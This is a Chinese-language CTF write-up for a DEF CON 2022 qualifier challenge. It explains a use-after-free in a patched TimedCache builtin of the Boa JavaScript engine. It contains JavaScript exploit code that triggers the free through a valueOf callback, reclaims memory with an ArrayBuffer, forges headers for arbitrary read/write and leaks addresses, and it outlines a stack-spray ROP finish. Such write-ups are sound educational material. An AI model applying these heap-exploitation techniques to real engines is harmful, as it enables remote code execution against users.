@@ -1,0 +1,166 @@
+    unsafe impl Trace for TimeCachedValue {
+        custom_trace!(this, {
+            if !this.is_expired() {
+                mark(&this.data); // ---->[1]
+            } 
+        });
+    }
+`TimeCache` 的`BuiltIn`中最重要的部分是注册的三个method，分别是`set`, `get`和 `has`，代码位于
+`boa_engine/src/builtins/timed_cache/mod.rs`。
+`TimedCache.prototype.set( key, value, lifetime )`函数向
+`OrderedMap`中插入一个`key:TimeCachedValue(value,expire)`的键值对。此处的 `expire`到期时间由参数
+`lifetime`与当前时间相加计算得到[2]，单位是毫秒。
+    pub(crate) fn set(
+            this: &JsValue,
+            args: &[JsValue],
+            context: &mut Context,
+        ) -> JsResult {
+            let key = args.get_or_undefined(0);
+            let value = args.get_or_undefined(1);
+            if let Some(object) = this.as_object() {
+                if let Some(cache) = object.borrow_mut().as_timed_cache_mut() {
+                    let key = match key {
+                        JsValue::Rational(r) => {
+                            if r.is_zero() {
+                                JsValue::Rational(0f64)
+                            } else {
+                                key.clone()
+                            }
+                        }
+                        _ => key.clone(),
+                    };
+                    if let Some(value_obj) = value.as_object() {
+                        let expire = calculate_expire(args.get_or_undefined(2), context)?; // ------>[2]
+                        cache.insert(key, TimeCachedValue::new(
+                                value_obj.clone(), expire as u128));
+                        return Ok(this.clone());
+                    }
+                    return context.throw_type_error("'value' i not an Object");
+                }
+            }
+            context.throw_type_error("'this' is not a Map")
+        }
+`TimedCache.prototype.get( key, lifetime=null
+)`函数根据参数key返回`OrderedMap`中对应的`TimeCachedValue`，如果没有或者`TimeCachedValue`已经超过到期时间，则返回
+`undefined`。此外，也可以再次传入 `lifetime` 参数设置这个对象的到期时间。
+    pub(crate) fn get(
+            this: &JsValue,
+            args: &[JsValue],
+            context: &mut Context,
+        ) -> JsResult {
+            const JS_ZERO: &JsValue = &JsValue::Rational(0f64);
+            let key = args.get_or_undefined(0);
+            let key = match key {
+                JsValue::Rational(r) => {
+                    if r.is_zero() {
+                        JS_ZERO
+                    } else {
+                        key
+                    }
+                }
+                _ => key,
+            };
+            if let JsValue::Object(ref object) = this {
+                if !check_is_not_expired(object, key, context)? {
+                    return Ok(JsValue::undefined());
+                }
+                let new_lifetime = args.get_or_undefined(1);
+                let expire = if !new_lifetime.is_undefined() && !new_lifetime.is_null() {
+                    Some(calculate_expire(new_lifetime, context)?)
+                } else {
+                    None
+                };
+                if let Some(cache) = object.borrow_mut().as_timed_cache_mut() {
+                    if let Some(cached_val) = cache.get_mut(key) {
+                        if let Some(expire) = expire {
+                            cached_val.expire = expire as u128;
+                        }
+                        return Ok(JsValue::Object(cached_val.data.clone()));
+                    }
+                    return Ok(JsValue::undefined());
+                }
+            }
+            context.throw_type_error("'this' is not a Map")
+        }
+### 漏洞分析
+以上补丁相当于维护了一个 `TimeCache` 的队列，我们通过 `set()` 和`get()` 向其中存取对象。但是这里有一个问题，`set()`
+插入到 `TimeCache` 的对象到期后并不会从队列中删除，也就是说队列中可以存在一个已经被释放掉的对象，如果我们可以将它取出，那就能构造到一个 UAF
+漏洞。但事实上 `get()` 会检查对象的到期时间，如果已经到期则会返回 `undefined` 。注意到 `get()`
+函数取对象的操作在检查之后，因此如果能够在时间检查和对象取值之间释放该对象，那么就可以拿到一个被释放后的对象。
+### 漏洞利用
+注意到如果在`TimedCache.prototype.get( key, lifetime=null )`中设置了 `lifetime` 的值，则会在
+`calculate_expire` 中取出这个值进行计算。如果`lifetime`存在 `valudOf`
+属性，则取值的时候有机会执行回调函数。在回调函数内部可以实现对象释放。
+构造如下代码，首先用`set()`注册一个 `key` 为 “first” 的 object，到期时间为1000。这里重写
+`fake_expire_time` 的 `valueOf()` 函数，并用`fake_expire_time` 作为参数用 `get()`
+从队列中取出键为 “first” 的object，这时的 object 没有到期，于是可以通过 `get()` 的时间检测走到的
+`calculate_expire` 函数。 `calculate_expire` 对 `fake_expire_time` 取值的时候会触发
+callback，回调函数内部等待对象到期，并调用垃圾回收函数`console.collectGarbage()`释放对象。等待 `get()`
+函数的返回，返回值则是已经被释放的object指针。
+    // trigger the UAF
+    var overlap;
+    var fake_expire_time = { 1: 2 };
+    fake_expire_time.valueOf = function () {
+      console.sleep(2000);
+      console.collectGarbage();
+      return -1;
+    };
+    var tc = new TimedCache();
+    tc.set("first", {}, 1000); //---->[3]
+    var freed_obj = tc.get("first", fake_expire_time);
+为了控制这个被释放的
+object，我们继续创建新的`ArrayBuffer`占位。在尝试占位的时候发现占位对象始终为`ArrayBuffer`的头部数据而非二进制存储数据。经过调试，单个`{}`占用0x150字节大小的堆内存[3]，于是修改
+exp 如下：
+    // trigger the UAF
+    var overlap;
+    var fake_expire_time = { 1: 2 };
+    fake_expire_time.valueOf = function () {
+      console.sleep(2000);
+      console.collectGarbage();
+      overlap = new ArrayBuffer(0x150);
+      //{1:{}}                             {1:{}}
+      //^    ^  [3]
+    var info_first = console.debug(tc.get("first"));
+    console.log(info_first);
+    var freed_obj = tc.get("first", fake_expire_time);
+`{ 1: {} }`被释放时，两个大小为0x150的内存分别被释放，当分配大小为0x150的 `ArrayBuffer`时，分别会分配0x150的
+Header 和 Array Buffer Data 空间，Header 会占用 inner 对象的内存，Array Buffer Data 则会占用
+outer 对象的内存。Array Buffer Data 数据可控，因此 outer 对象的内存可以伪造。分别打印没有 UAF 之前的
+tc.get("first”) 和 UAF 之后的 overlap、freed_obj 的值，可以看到 overlap 的 Array Buffer
+Data 已经和释放的`{ 1: {} }`重叠。
+    var info_first = console.debug(tc.get("first"));
+    console.log(info_first);
+    console.log(console.debug(overlap));
+    console.log(console.debug(freed_obj));
+接下来伪造数据进行类型混淆。通过将 UAF 的 Object 内存伪造为`ArrayBuffer`的 Header 内存，并设置 Header 内
+Array Buffer Data 的地址就可以实现任意地址读写的原语。通过任意地址读，可以泄露代码基地址、栈地址、libc基地址信息。
+    var view = new DataView(overlap);
+    var addr_first = BigInt(info_first.substring(32, 46)) - 0x28n;
+    var method_addr = BigInt(info_first.substring(58, 72));
+    function set64(view, idx, value) {
+      view.setBigUint64(idx, value, true);
+    }
+    var leak_addr = addr_first + 0x100n;
+    set64(view, 0x28, leak_addr + 2n); //addr+2
+    set64(view, 6 * 8, leak_addr); //addr
+    set64(view, 7 * 8, 0x300n);
+    set64(view, 8 * 8, 0x300n);
+    set64(view, 9 * 8, 0x300n);
+    set64(view, 10 * 8, 0x301n); 
+    set64(view, 14 * 8, leak_addr); //addr
+    set64(view, 15 * 8, 0x300n);
+    set64(view, 16 * 8, 0x300n);
+    set64(view, 17 * 8, method_addr_arr1); //method
+    console.log(console.debug(freed_obj));
+    var view_anywhere = new DataView(freed_obj);
+    function get64(view, idx) {
+      return view.getBigUint64(idx, true);
+    }
+    var code_addr = get64(view_anywhere, 0x10 + 0x80) - 0x11c9db0n;
+    var stack_addr = get64(view_anywhere, 0x60 + 0x80);
+有了任意地址读写后，最简单的利用方法就是通过读 got 表泄露 libc 地址，并覆盖 libc 中的 `__free_hook` 为
+onegadget，最后用`collectGarbage()`或`.exit`调用 free 触发 onegadget 。然而这道题使用的环境是
+ubuntu 20.04，onegadget 的利用条件比较苛刻，几个备选都不能满足条件。
+考虑到栈地址和程序基地址已经被泄露，所以可以在栈上写 ROP
+进行利用。然而调试发现栈的布局非常不稳定，所以这里在ROP前加了一步栈喷，在存放`__libc_start_main` 的栈地址附近喷射大量
+`ret`，程序正常退出时调用到这里执行ROP。完整的利用代码见[exp.js](https://github.com/Q1IQ/ctf/blob/master/defcon-qualifier-2022/constricted/exp.js)。
